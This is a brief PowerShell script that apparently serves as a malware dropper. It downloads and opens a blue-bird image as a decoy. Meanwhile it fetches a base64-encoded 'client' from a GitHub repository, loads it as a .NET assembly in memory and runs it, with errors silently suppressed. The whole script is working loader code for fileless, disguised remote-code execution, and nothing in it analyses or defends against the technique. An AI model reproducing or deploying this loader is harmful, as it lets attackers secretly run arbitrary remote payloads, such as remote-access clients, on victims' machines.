try {
    # Download the image
    Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
    
    # Open the downloaded image
    Start-Process "$env:TEMP\blue-bird.jpg"
    
    # Download the encoded.txt file (base64 encoded client)
    $encodedUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/encoded.txt"
    $base64Content = (Invoke-WebRequest -Uri $encodedUrl).Content
    
    # Decode the base64 content to a byte array
    $bytes = [System.Convert]::FromBase64String($base64Content)
    
    # Load the assembly in memory
    $assembly = [System.Reflection.Assembly]::Load($bytes)
    
    # Get the entry point and invoke it
    $entryPoint = $assembly.EntryPoint
    if ($entryPoint) {
        $entryPoint.Invoke($null, [object[]]@())
    }
} catch {
    # Write-Host "An error occurred: $_"

    # Show error message box
    # Add-Type -AssemblyName PresentationFramework
    # [System.Windows.MessageBox]::Show("An error occurred: $_", "Error", "OK", "Error")
}